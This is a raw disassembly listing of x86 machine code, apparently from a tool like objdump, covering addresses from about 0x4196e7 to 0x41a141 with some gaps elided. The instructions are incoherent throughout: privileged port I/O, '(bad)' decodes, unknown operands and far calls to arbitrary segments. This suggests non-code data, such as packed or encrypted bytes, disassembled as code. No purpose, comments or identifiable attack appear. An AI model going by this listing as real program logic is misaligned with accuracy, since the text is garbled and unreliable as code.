  4196e7:	mov    eax,ds:0x6df2be9f
  4196ec:	mov    ebp,?
  4196ee:	inc    esp
  4196ef:	loopne 0x41968d
  4196f1:	jb     0x419715
  4196f3:	out    dx,al
  4196f4:	mov    ecx,0xf733eac1
  4196f9:	icebp  
  4196fa:	cmc    
  4196fb:	mov    eax,es:0x7f1969c4
  419701:	push   esi
  419702:	fldenv [edx+0x328adc08]
  419708:	dec    ebx
  419709:	(bad)  
  41970a:	mov    WORD PTR [ecx],ss
  41970c:	ror    DWORD PTR [ecx+0x2387],cl
	...
  419772:	add    BYTE PTR [eax],al
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x498dd0ae
  419781:	das    
  419782:	clc    
  419783:	push   esp
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	cs and ebx,esi
  41978f:	push   ebp
  419790:	iret   
  419791:	adc    al,dl
  419793:	iret   
  419794:	ret    0xa38
  419797:	inc    ecx
  419798:	daa    
  419799:	mov    al,ds:0x990cabee
  41979e:	push   0xffffffef
  4197a0:	inc    esp
  4197a1:	cmp    eax,0x55767630
  4197a6:	stos   DWORD PTR es:[edi],eax
  4197a7:	pusha  
  4197a8:	imul   esi,DWORD PTR [eax+eiz*2-0x70],0x2f
  4197ad:	das    
  4197ae:	mov    ebx,DWORD PTR [esi+0x5b153ce2]
  4197b4:	xor    ebx,ebx
  4197b6:	out    dx,eax
  4197b7:	popf   
  4197b8:	push   ebx
  4197b9:	mov    ecx,0x5de4988d
  4197be:	push   esi
  4197bf:	ret    
  4197c0:	adc    dh,dl
  4197c2:	xchg   edx,eax
  4197c3:	inc    edx
  4197c4:	enter  0x7bb3,0xd0
  4197c8:	(bad)  
  4197c9:	outs   dx,BYTE PTR ds:[esi]
  4197ca:	push   cs
  4197cb:	xor    eax,0xe1116f9f
  4197d0:	mov    ecx,0xda1424a0
  4197d5:	test   al,0xab
  4197d7:	hlt    
  4197d8:	push   ebx
  4197d9:	int    0xe2
  4197db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197dc:	jno    0x4197fc
  4197de:	or     DWORD PTR [edx+0x1ccf5630],ebx
  4197e4:	xor    al,0x3c
  4197e6:	pushf  
  4197e7:	adc    eax,0x80278250
  4197ec:	out    0x53,al
  4197ee:	mov    esi,DWORD PTR [ebp-0x7b67dd2e]
  4197f4:	sub    eax,0xb34ae2a6
  4197f9:	das    
  4197fa:	dec    ecx
  4197fb:	add    ah,BYTE PTR [ecx+0x4b4e7b82]
  419801:	std    
  419802:	bound  esi,QWORD PTR [eax-0x623fde24]
  419808:	pop    edx
  419809:	sbb    al,0x1c
  41980b:	mov    eax,ds:0x4c8380d2
  419810:	dec    esp
  419811:	adc    ecx,ecx
  419813:	xchg   esi,eax
  419814:	in     eax,0x29
  419816:	mov    al,ds:0xe7616122
  41981b:	mov    dh,0x9
  41981d:	in     al,0xfe
  41981f:	dec    ebx
  419820:	xor    al,0x42
  419822:	fcomp  DWORD PTR [esi]
  419824:	mov    bh,BYTE PTR [ebx-0x52]
  419827:	hlt    
  419828:	or     BYTE PTR ds:0xdea96296,dh
  41982e:	jmp    0x4197ed
  419830:	call   0x78d:0x768443e3
  419837:	xchg   edx,eax
  419838:	mov    ebx,0x7eb990ba
  41983d:	mov    eax,0xbb459f8e
  419842:	lods   al,BYTE PTR ds:[esi]
  419843:	dec    esi
  419844:	(bad)  
  419845:	jne    0x41985e
  419847:	sbb    al,0x74
  419849:	fild   DWORD PTR [eax-0x163e79dd]
  41984f:	jl     0x419840
  419851:	mul    DWORD PTR [eax-0x25]
  419854:	mov    bh,0xbc
  419856:	idiv   DWORD PTR [edi+0x6ce3d768]
  41985c:	add    eax,0x78f6790b
  419861:	inc    ebx
  419862:	test   BYTE PTR [edx],al
  419864:	and    ebp,DWORD PTR [ebx-0x85770a9]
  41986a:	pop    ds
  41986b:	mov    bh,0x7f
  41986d:	ins    BYTE PTR es:[edi],dx
  41986e:	inc    eax
  41986f:	out    0x46,al
  419871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419872:	jmp    0x419843
  419874:	fcmovnu st,st(4)
  419876:	push   esp
  419877:	mov    eax,ds:0x7d2084ba
  41987c:	inc    ebx
  41987d:	and    esi,DWORD PTR [edx+ebp*2]
  419880:	test   BYTE PTR [esi+0x5e81dcb6],bl
  419886:	xor    DWORD PTR ds:0x9249ae71,0x1868b8f6
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fisttp QWORD PTR [edx+edi*2]
  419902:	jg     0x419900
  419904:	int3   
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	daa    
  41990d:	adc    DWORD PTR [ebx-0x63],edx
  419910:	dec    ebp
  419911:	sub    al,0x47
  419913:	(bad)  
  419914:	fdiv   DWORD PTR [edi-0x14]
  419917:	jae    0x419910
  419919:	das    
  41991a:	nop
  41991b:	dec    edx
  41991c:	cmp    BYTE PTR es:[ebx],dl
  41991f:	lea    eax,[edx+0x5265700c]
  419925:	jmp    0x3aacaafb
  41992a:	jmp    0xa63f1475
  41992f:	jge    0x4198d6
  419931:	push   es
  419932:	add    bl,ah
  419934:	add    dl,BYTE PTR [edx+0x11]
  419937:	unpckhps xmm2,XMMWORD PTR [edx+0x21803376]
  41993e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41993f:	stos   BYTE PTR es:[edi],al
  419940:	inc    ebx
  419941:	sub    eax,0x764798f9
  419946:	popf   
  419947:	mov    WORD PTR [eax+0x46],?
  41994a:	or     BYTE PTR [edx-0x36],ch
  41994d:	pop    ds
  41994e:	mov    bh,0xd4
  419950:	int3   
  419951:	xor    eax,0x22f9ee34
  419956:	sub    DWORD PTR [edi],0x52f5e273
  41995c:	xor    ax,0xcd8d
  419960:	push   eax
  419961:	mov    dl,0x89
  419963:	or     esp,DWORD PTR [ebx+0x5ab1721b]
  419969:	mul    dh
  41996b:	adc    DWORD PTR [ebp+0x77],ecx
  41996e:	pop    ebp
  41996f:	popa   
  419970:	and    eax,0x2eadf8ab
  419975:	popa   
  419976:	dec    esi
  419977:	push   0xe66443ff
  41997c:	inc    edi
  41997d:	scas   eax,DWORD PTR es:[edi]
  41997e:	cmp    BYTE PTR [edi],ch
  419980:	dec    ebp
  419981:	jns    0x4199c0
  419983:	rcl    dl,1
  419985:	and    BYTE PTR [ebx+0x3bceb668],ch
  41998b:	imul   ebx,DWORD PTR [ebp-0x1f436700],0xb9813836
  419995:	fsubr  st,st(6)
  419997:	out    dx,al
  419998:	mov    al,BYTE PTR [esi]
  41999a:	and    eax,0x9cdb8cd8
  41999f:	and    esp,edx
  4199a1:	jecxz  0x4199d2
  4199a3:	(bad)  
  4199a4:	outs   dx,DWORD PTR ds:[esi]
  4199a5:	mov    al,ds:0xe56469ad
  4199aa:	dec    eax
  4199ab:	xlat   BYTE PTR ds:[ebx]
  4199ac:	and    al,0xf8
  4199ae:	loope  0x4199da
  4199b0:	mov    al,ds:0x5566414a
  4199b5:	and    DWORD PTR [ebx-0x70],edx
  4199b8:	scas   eax,DWORD PTR es:[edi]
  4199b9:	dec    edx
  4199ba:	dec    esi
  4199bc:	sub    BYTE PTR [esi-0x48],bl
  4199bf:	mov    WORD PTR [ecx],ss
  4199c1:	mov    DWORD PTR ds:0x5542dd85,esp
  4199c7:	dec    edx
  4199c8:	(bad)
  4199cb:	cmc    
  4199cc:	pop    ecx
  4199cd:	sub    BYTE PTR [eax+0x72e6165e],dh
  4199d3:	mov    ds:0xcab38bd6,al
  4199d8:	inc    esi
  4199d9:	pop    ss
  4199da:	sub    al,0x11
  4199dc:	and    edi,DWORD PTR [edi+0x157b4edf]
  4199e2:	jne    0x419a32
  4199e4:	sub    DWORD PTR [ecx-0x65],esi
  4199e7:	xchg   edi,eax
  4199e8:	dec    ebp
  4199e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ea:	lea    ecx,[edi+0x970cc7e]
  4199f0:	(bad)  
  4199f1:	and    ecx,ecx
  4199f3:	push   0x6b
  4199f5:	out    0x11,al
  4199f7:	and    eax,0xd7182498
  4199fc:	cwde   
  4199fd:	mov    cl,0xb5
  4199ff:	add    eax,0x1207f44
  419a04:	push   eax
  419a05:	(bad)  
  419a06:	adc    ecx,ebx
  419a08:	and    ch,BYTE PTR [eax-0x4401cfde]
  419a0e:	lea    esi,[ebp+0x0]
	...
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0xf792f0c2,cl
  419a83:	cmp    eax,edx
  419a85:	sgdtd  [eax]
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	or     eax,0x64b2245c
  419a91:	jbe    0x419afb
  419a93:	xchg   BYTE PTR [eax],ah
  419a95:	outs   dx,DWORD PTR ds:[esi]
  419a96:	inc    ebx
  419a97:	or     BYTE PTR [ebx],0x6f
  419a9a:	mov    eax,ds:0xd4833155
  419a9f:	add    eax,0x5aea3fee
  419aa4:	jb     0x419ac6
  419aa6:	cwde   
  419aa7:	fst    QWORD PTR [ebx+0x44f8ea49]
  419aad:	ret    
  419aae:	jmp    0xad5b:0x8dd5a8a3
  419ab5:	sbb    ah,BYTE PTR [edx+edi*4-0x5d]
  419ab9:	xchg   ecx,eax
  419aba:	stc    
  419abb:	jae    0x419a59
  419abd:	fisttp QWORD PTR [edx-0x14f3fa65]
  419ac3:	sti    
  419ac4:	xchg   edi,eax
  419ac5:	ins    BYTE PTR es:[edi],dx
  419ac6:	jnp    0x419a9f
  419ac8:	data16 jge 0x419af7
  419acb:	push   ebp
  419acc:	fisubr WORD PTR [esi]
  419ace:	pop    ebp
  419acf:	cmp    al,0x6e
  419ad1:	pop    es
  419ad2:	sub    eax,0x5cefad7e
  419ad7:	add    al,0x27
  419ad9:	call   0x8947:0xcf4b5429
  419ae0:	in     al,dx
  419ae1:	int3   
  419ae2:	sub    al,0xb
  419ae4:	dec    ebp
  419ae5:	retf   
  419ae6:	xchg   ebp,eax
  419ae7:	or     eax,0xa71e078b
  419aec:	jb     0x419ad0
  419aee:	adc    eax,0xb6d4ecb5
  419af3:	inc    ebx
  419af4:	mov    BYTE PTR [edx-0x22],dl
  419af7:	(bad)  
  419af8:	lock cld 
  419afa:	and    al,0xed
  419afc:	jns    0x419b4f
  419afe:	dec    esi
  419aff:	xlat   BYTE PTR ds:[ebx]
  419b00:	daa    
  419b01:	repz dec ecx
  419b03:	cmp    ah,cl
  419b05:	out    dx,eax
  419b06:	shl    BYTE PTR [eax],1
  419b08:	test   ebp,ebx
  419b0a:	or     BYTE PTR [edx],dl
  419b0c:	sar    bh,0xa0
  419b0f:	(bad)  
  419b10:	je     0x419ae4
  419b12:	retf   0xd89e
  419b15:	push   es
  419b16:	add    esp,edx
  419b18:	call   FWORD PTR [edi+ebp*1]
  419b1b:	sub    ebx,edx
  419b1d:	nop
  419b1e:	mov    dh,0x78
  419b20:	adc    al,0xea
  419b22:	pushf  
  419b23:	call   0x7976:0x91b435d3
  419b2a:	jb     0x419b14
  419b2c:	clc    
  419b2d:	sbb    edi,DWORD PTR [ecx]
  419b2f:	inc    ecx
  419b30:	dec    ebx
  419b31:	sbb    bl,ch
  419b33:	cmp    BYTE PTR [esi+0x14],ah
  419b36:	pop    ebx
  419b37:	clc    
  419b38:	xchg   esi,eax
  419b39:	in     al,0xdb
  419b3b:	ja     0x419b6c
  419b3d:	adc    DWORD PTR [ebp+0x55],edi
  419b40:	and    eax,0x26e3c2ed
  419b45:	repz and ebx,ecx
  419b48:	gs and eax,0xdbce518c
  419b4e:	mov    cl,0x79
  419b50:	fsubr  QWORD PTR [ecx+0x56]
  419b53:	pop    ebp
  419b54:	mov    ah,0x46
  419b56:	aad    0xf0
  419b58:	or     edx,esp
  419b5a:	sbb    DWORD PTR [ebx+edx*4+0x26],esi
  419b5e:	lods   eax,DWORD PTR ds:[esi]
  419b5f:	repz mov ah,0x76
  419b62:	daa    
  419b63:	and    bl,BYTE PTR [ecx-0x19]
  419b66:	sbb    DWORD PTR fs:[ecx-0x1f3f3519],0x1768a294
  419b71:	mov    esi,0x22892ff1
  419b76:	test   eax,0xb48b3b6a
  419b7b:	leave  
  419b7c:	daa    
  419b7d:	repnz loopne 0x419b40
  419b80:	fdiv   st(6),st
  419b82:	cmp    edi,edx
  419b84:	dec    ebx
  419b85:	(bad)  
  419b86:	cmp    ebp,ebp
  419b88:	and    al,0xf9
  419b8a:	and    ch,cl
  419b8c:	dec    ebx
  419b8d:	dec    ecx
  419b8e:	mov    ds:0xbf,eax
	...
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xc5
  419c01:	icebp  
  419c02:	jbe    0x419c67
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	jmp    0x773e:0x6255905b
  419c13:	and    DWORD PTR [ebp-0x441956b0],eax
  419c19:	out    dx,al
  419c1a:	push   edi
  419c1b:	sbb    DWORD PTR [edi],edx
  419c1d:	jb     0x419c8c
  419c1f:	loopne 0x419ca0
  419c21:	hlt    
  419c22:	sub    edx,DWORD PTR [esp+edi*4]
  419c25:	scas   eax,DWORD PTR es:[edi]
  419c26:	and    edi,DWORD PTR [esi]
  419c28:	push   eax
  419c29:	inc    ecx
  419c2a:	not    BYTE PTR [ebp+esi*4+0x4a94a8f2]
  419c31:	xchg   edi,eax
  419c32:	xor    al,0x82
  419c34:	xchg   esi,eax
  419c35:	out    dx,al
  419c36:	sti    
  419c37:	shr    BYTE PTR [ebx+0x67],cl
  419c3a:	mov    esp,0xe160f022
  419c3f:	shr    DWORD PTR [esi],cl
  419c41:	ins    DWORD PTR es:[edi],dx
  419c42:	lods   eax,DWORD PTR ds:[esi]
  419c43:	into   
  419c44:	jb     0x419bd2
  419c46:	arpl   dx,bx
  419c48:	enter  0x7b54,0x85
  419c4c:	rcr    DWORD PTR [edx+0x62],cl
  419c4f:	dec    ebx
  419c50:	jmp    0xda5074f
  419c55:	(bad)  
  419c56:	jl     0x419c28
  419c58:	sbb    eax,0xada0ddd4
  419c5d:	mov    ah,BYTE PTR ss:[esi]
  419c60:	mov    dh,0x2e
  419c62:	shl    DWORD PTR [esi+0x77],0x50
  419c66:	cld    
  419c67:	daa    
  419c68:	push   edi
  419c69:	ret    0xf9ef
  419c6c:	inc    esi
  419c6d:	push   ebp
  419c6e:	ret    0x9973
  419c71:	mov    dh,0xef
  419c73:	cmp    al,0xfd
  419c75:	sub    BYTE PTR [eax-0x4ccc2314],0x7a
  419c7c:	rcr    BYTE PTR [ebx+ebp*8+0x1cfb99dc],cl
  419c83:	ficomp WORD PTR [ebp-0x1d6103b8]
  419c89:	lock cs dec ecx
  419c8c:	lods   al,BYTE PTR ds:[esi]
  419c8d:	pop    ebx
  419c8e:	inc    esi
  419c8f:	sub    DWORD PTR [eax-0x36],eax
  419c92:	repz pop ebx
  419c94:	cmovne eax,DWORD PTR [ebp-0x28]
  419c98:	xchg   ebp,eax
  419c99:	outs   dx,DWORD PTR ds:[esi]
  419c9a:	inc    ebp
  419c9b:	mov    esi,0xa7c5ed74
  419ca0:	arpl   WORD PTR [ecx+ebp*2-0x1d],ax
  419ca4:	adc    DWORD PTR ds:0x83703466,edi
  419caa:	fs mov edi,0x818d32d5
  419cb0:	pop    esp
  419cb1:	add    DWORD PTR [ebx],edi
  419cb3:	push   esi
  419cb4:	mov    ch,0x39
  419cb6:	add    eax,0x70b6dc40
  419cbb:	pop    ds
  419cbc:	adc    eax,0x20f93b9c
  419cc1:	sub    edi,DWORD PTR [edi+0x3504ad32]
  419cc7:	enter  0x513b,0xfc
  419ccb:	iret   
  419ccc:	mov    bh,0xeb
  419cce:	lock call 0xdae49682
  419cd4:	enter  0x83a8,0x9f
  419cd8:	inc    eax
  419cd9:	sahf   
  419cda:	test   al,0xe0
  419cdc:	cmc    
  419cdd:	jl     0x419d22
  419cdf:	cwde   
  419ce0:	lahf   
  419ce1:	jno    0x419cce
  419ce3:	sbb    esp,DWORD PTR [edi-0x5ad85847]
  419ce9:	lods   eax,DWORD PTR ds:[esi]
  419cea:	sbb    al,0x9
  419cec:	cli    
  419ced:	xor    ebp,ebp
  419cef:	push   esp
  419cf0:	les    edx,FWORD PTR [ebp+0x76]
  419cf3:	adc    al,0xf3
  419cf5:	sbb    al,BYTE PTR [ecx]
  419cf7:	xor    ebp,ebp
  419cf9:	mov    esi,0xf85e13ad
  419cfe:	std    
  419cff:	iret   
  419d00:	or     bh,ch
  419d02:	(bad)  
  419d03:	int    0x1f
  419d05:	sub    dl,ah
  419d07:	into   
  419d08:	mov    bh,0xa5
  419d0a:	adc    esp,edx
  419d0c:	bound  ebp,QWORD PTR [esi+eax*1]
  419d0f:	inc    BYTE PTR [eax]
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fidivr DWORD PTR ss:[edi]
  419d81:	shr    DWORD PTR [eax+0x111d816],1
  419d87:	add    BYTE PTR [ecx+eax*1],al
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	fldcw  WORD PTR [ebx-0x5ac9f6a9]
  419d92:	cmp    dh,BYTE PTR [esi+0x58]
  419d95:	jl     0x419d35
  419d97:	push   edx
  419d98:	test   eax,0x96c076db
  419d9d:	retf   0xe167
  419da0:	rcl    BYTE PTR [ebx+0x3162af59],1
  419da6:	inc    edi
  419da7:	pop    es
  419da8:	mov    edx,esp
  419daa:	push   edx
  419dab:	inc    ebx
  419dac:	fistp  DWORD PTR [eax-0x43]
  419daf:	xchg   esp,eax
  419db0:	mov    ch,0x3f
  419db2:	mov    ebp,0xf46dad9b
  419db7:	jge    0x419e05
  419db9:	outs   dx,DWORD PTR ds:[esi]
  419dba:	mov    al,0x5f
  419dbc:	js     0x419db5
  419dbe:	add    al,0x3d
  419dc0:	xor    DWORD PTR [esp+eax*2-0x5718d384],0xc6f3c573
  419dcb:	jne    0x419d7c
  419dcd:	inc    esp
  419dce:	push   cs
  419dcf:	mov    gs,WORD PTR [ebp+0x6b]
  419dd2:	xchg   DWORD PTR [esi-0x1a],ebx
  419dd5:	mov    ds:0x99f5124f,eax
  419dda:	lock hlt 
  419ddc:	pop    edi
  419ddd:	push   0xe0d73860
  419de2:	xchg   esp,eax
  419de3:	cmp    al,0xdb
  419de5:	mov    eax,0x4cf1e55a
  419dea:	repz adc al,0xef
  419ded:	and    DWORD PTR [eax+0x4e],0x7b
  419df1:	stos   BYTE PTR es:[edi],al
  419df2:	jo     0x419e6b
  419df4:	xor    DWORD PTR [edx-0xa3bd2f2],esp
  419dfa:	sbb    al,0x55
  419dfc:	std    
  419dfd:	ins    DWORD PTR es:[edi],dx
  419dfe:	das    
  419dff:	pop    ds
  419e00:	sbb    ecx,edi
  419e02:	adc    edi,esp
  419e04:	sbb    DWORD PTR [ebp+ebx*1+0x1c],0x46bb9dab
  419e0c:	rcl    ebx,1
  419e0e:	xchg   edx,eax
  419e0f:	ret    0x16b
  419e12:	xchg   ebp,eax
  419e13:	jl     0x419dc7
  419e15:	scas   eax,DWORD PTR es:[edi]
  419e16:	add    DWORD PTR [ebx-0x248e6ea1],0xe0f19eff
  419e20:	aaa    
  419e21:	mov    al,0x7d
  419e23:	sbb    eax,0x3e96b102
  419e28:	push   0x2e
  419e2a:	mov    dh,0xf0
  419e2c:	add    DWORD PTR [ecx-0x27],eax
  419e2f:	mov    ds:0xd97e6104,al
  419e34:	popa   
  419e35:	pop    eax
  419e36:	jae    0x419e0d
  419e38:	lods   al,BYTE PTR ds:[esi]
  419e39:	push   DWORD PTR [ebp-0x40b73581]
  419e3f:	out    dx,al
  419e40:	xchg   ebx,eax
  419e41:	add    DWORD PTR ss:[eax],ebx
  419e44:	(bad)  
  419e45:	inc    DWORD PTR ds:0x6d381a67
  419e4b:	repnz sahf 
  419e4d:	lds    ebp,FWORD PTR [ebx-0x76795ba1]
  419e53:	imul   ebp,DWORD PTR [edx],0x31c4153f
  419e59:	dec    ebx
  419e5a:	mov    esp,0xcb234592
  419e5f:	xor    al,0x14
  419e61:	mov    ds:0x6108d950,al
  419e66:	mov    eax,ds:0x4a8ef7a9
  419e6b:	in     eax,0x39
  419e6d:	lock jmp 0x44505c53
  419e73:	dec    ecx
  419e74:	cmp    al,dh
  419e76:	sbb    ebp,DWORD PTR [edi]
  419e78:	mov    bh,0x93
  419e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e7b:	imul   esp,DWORD PTR [ecx+eax*4+0x23],0xffffffad
  419e80:	(bad)  
  419e82:	jo     0x419e62
  419e84:	fst    QWORD PTR [esi]
  419e86:	sbb    DWORD PTR [edx+ebp*1+0x6dcc3626],0xbc6137
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	pop    esp
  419f01:	pop    esi
  419f02:	or     BYTE PTR [esp+ebx*8],0x12
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    al,0x1
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	cs sbb esp,edx
  419f0f:	ret    0xe77
  419f12:	pop    edi
  419f13:	mov    dh,0x5
  419f15:	loopne 0x419f08
  419f17:	jb     0x419f49
  419f19:	shl    BYTE PTR [ebx],cl
  419f1b:	into   
  419f1c:	jl     0x419f6d
  419f1e:	pusha  
  419f1f:	scas   eax,DWORD PTR es:[edi]
  419f20:	test   al,0xf
  419f22:	jge    0x419eb5
  419f24:	mov    esp,0x3c938faa
  419f29:	jl     0x419eb2
  419f2b:	shl    BYTE PTR [edx],cl
  419f2d:	xchg   ebx,eax
  419f2e:	add    BYTE PTR [edi+0x37],0xdc
  419f32:	or     bl,0x20
  419f35:	pop    esi
  419f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f37:	push   ecx
  419f38:	adc    al,0xd1
  419f3a:	arpl   ax,ax
  419f3c:	call   0x78d265ad
  419f41:	stos   DWORD PTR es:[edi],eax
  419f42:	je     0x419f21
  419f44:	outs   dx,DWORD PTR ds:[esi]
  419f45:	mov    edx,0xf34aa209
  419f4a:	jg     0x419eea
  419f4c:	pop    esi
  419f4d:	fldcw  WORD PTR [ebp*2-0x55c53e0e]
  419f54:	mov    ah,0x38
  419f56:	in     al,dx
  419f57:	fisubr WORD PTR ds:0xa2e3a65f
  419f5d:	sub    al,0x6
  419f5f:	mov    esp,DWORD PTR [ebx-0x19]
  419f62:	loopne 0x419ef2
  419f64:	add    eax,0x9551ab48
  419f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f6a:	xor    BYTE PTR [ebx+eiz*8-0x78],cl
  419f6e:	in     eax,0x4b
  419f70:	sbb    dh,BYTE PTR ds:0x98b93806
  419f76:	xchg   edi,eax
  419f77:	scas   eax,DWORD PTR es:[edi]
  419f78:	pop    ss
  419f79:	sbb    BYTE PTR [esi+ecx*4+0x238d263a],bl
  419f80:	repnz (bad) 
  419f82:	hlt    
  419f83:	inc    ecx
  419f84:	sbb    ecx,DWORD PTR [edx]
  419f86:	or     BYTE PTR [eax+eiz*2],al
  419f89:	sub    DWORD PTR [eax+0x22],esp
  419f8c:	int    0x7a
  419f8e:	daa    
  419f8f:	repz in eax,dx
  419f91:	retf   0xa9b5
  419f94:	mov    ch,0x98
  419f96:	xor    BYTE PTR [ebp+ebx*4-0x20fbe08b],ah
  419f9d:	mov    edx,0x739dd92f
  419fa2:	rcr    BYTE PTR [esi+0x36dcfe23],0x7
  419fa9:	cmp    BYTE PTR [edx],dh
  419fab:	outs   dx,BYTE PTR ds:[esi]
  419fac:	and    BYTE PTR [eax+0x46e9e308],0xd1
  419fb3:	in     eax,0x72
  419fb5:	xor    esi,DWORD PTR [edx+0x4d]
  419fb8:	or     BYTE PTR [eax+0x19],bl
  419fbb:	mov    cl,0x9
  419fbd:	fstp   DWORD PTR [esi+0x37]
  419fc0:	sub    al,0xe5
  419fc2:	fmulp  st(2),st
  419fc4:	fbstp  TBYTE PTR [esi]
  419fc6:	outs   dx,BYTE PTR ds:[esi]
  419fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc8:	push   0x31
  419fca:	mov    ebp,0x66dca381
  419fcf:	outs   dx,BYTE PTR ds:[esi]
  419fd0:	xchg   edx,eax
  419fd1:	mov    ch,BYTE PTR [edi-0x4]
  419fd4:	pop    ebp
  419fd5:	push   eax
  419fd6:	add    eax,0x4de0185e
  419fdb:	cmc    
  419fdc:	ins    BYTE PTR es:[edi],dx
  419fdd:	rcl    DWORD PTR [ecx+edx*4+0x41923ca3],0x4a
  419fe5:	or     ecx,DWORD PTR [ecx]
  419fe7:	nop
  419fe8:	retf   
  419fe9:	or     al,BYTE PTR [eax+0x20]
  419fec:	aaa    
  419fed:	cmp    cl,BYTE PTR [eax+0x3d8503a7]
  419ff3:	lds    edi,FWORD PTR [edi-0x53]
  419ff6:	sub    ebp,ecx
  419ff8:	(bad)  
  419ff9:	push   ss
  419ffa:	mov    ch,0x2a
  419ffc:	call   0x77c0:0xca761131
  41a003:	push   cs
  41a004:	inc    esp
  41a005:	iret   
  41a006:	ror    BYTE PTR [esi-0x34],cl
  41a009:	adc    bl,BYTE PTR [ebx+0x252f9015]
  41a00f:	mov    edx,0x0
	...
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x6],bh
  41a081:	call   0x14228ad0
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	cmp    al,0xd
  41a08e:	pop    es
  41a08f:	jne    0x41a09e
  41a091:	das    
  41a092:	pop    edx
  41a093:	mov    cl,BYTE PTR [edi+esi*1-0x69]
  41a097:	iret   
  41a098:	mov    cl,0x7d
  41a09a:	dec    eax
  41a09b:	xor    al,0x18
  41a09d:	stos   BYTE PTR es:[edi],al
  41a09e:	test   al,0x3f
  41a0a0:	jne    0x41a0d2
  41a0a2:	aaa    
  41a0a3:	cmp    DWORD PTR [ecx-0x1],0xc7b8fd66
  41a0aa:	jmp    0x16e96e4e
  41a0af:	dec    ecx
  41a0b0:	dec    ebx
  41a0b1:	jmp    DWORD PTR [edx-0x75]
  41a0b4:	dec    eax
  41a0b5:	into   
  41a0b6:	out    dx,eax
  41a0b7:	mov    ?,edx
  41a0b9:	push   esp
  41a0ba:	in     al,0x15
  41a0bc:	out    dx,eax
  41a0bd:	clc    
  41a0be:	mov    ch,0x4f
  41a0c0:	pop    ds
  41a0c1:	and    ah,BYTE PTR [ecx-0x45f02ffe]
  41a0c7:	dec    eax
  41a0c8:	dec    esi
  41a0c9:	jns    0x41a0ea
  41a0cb:	mov    cl,0xd4
  41a0cd:	cmp    WORD PTR [eax+eiz*8+0x2c],cx
  41a0d2:	pop    esp
  41a0d3:	shl    BYTE PTR [esi+0x74b41722],1
  41a0d9:	jns    0x41a104
  41a0db:	pop    ss
  41a0dc:	fdiv   DWORD PTR [ebp+0x76]
  41a0df:	data16 xor dh,BYTE PTR ds:0x3b4c0099
  41a0e6:	sub    BYTE PTR [edi+0x23],al
  41a0e9:	call   DWORD PTR [edi+0x5b]
  41a0ec:	(bad)  
  41a0ed:	cmp    al,0x87
  41a0ef:	mov    dh,0x61
  41a0f2:	aas    
  41a0f3:	call   0x803b21ae
  41a0f8:	pop    eax
  41a0f9:	xor    al,0x1a
  41a0fb:	out    dx,eax
  41a0fc:	pop    ss
  41a0fd:	test   DWORD PTR [edi-0x32115b3b],esi
  41a103:	ret    
  41a104:	jecxz  0x41a097
  41a106:	test   DWORD PTR [edi+edi*2+0x6bd127a5],ebp
  41a10d:	fcmovb st,st(4)
  41a10f:	xchg   ebx,eax
  41a110:	push   0x3e201245
  41a115:	stc    
  41a116:	out    0x2c,al
  41a118:	lock xrelease xchg DWORD PTR [esi+0x64],ecx
  41a11d:	xor    esp,DWORD PTR [eax]
  41a11f:	mov    ds:0xbc2cc1be,eax
  41a124:	inc    ebp
  41a125:	add    dl,BYTE PTR [ebx+0x3a]
  41a128:	lock loop 0x41a0ad
  41a12b:	push   ds
  41a12c:	out    0x73,al
  41a12e:	mov    al,0xe0
  41a130:	loope  0x41a0c5
  41a132:	inc    esp
  41a133:	repz sti 
  41a135:	out    dx,al
  41a136:	pop    ebx
  41a137:	sar    DWORD PTR [edi+0x4cc043ee],0x6b
  41a13e:	pop    esi
  41a13f:	add    ebp,DWORD PTR [eax]
  41a141:	addr16 adc ebp,0x6e768fd8
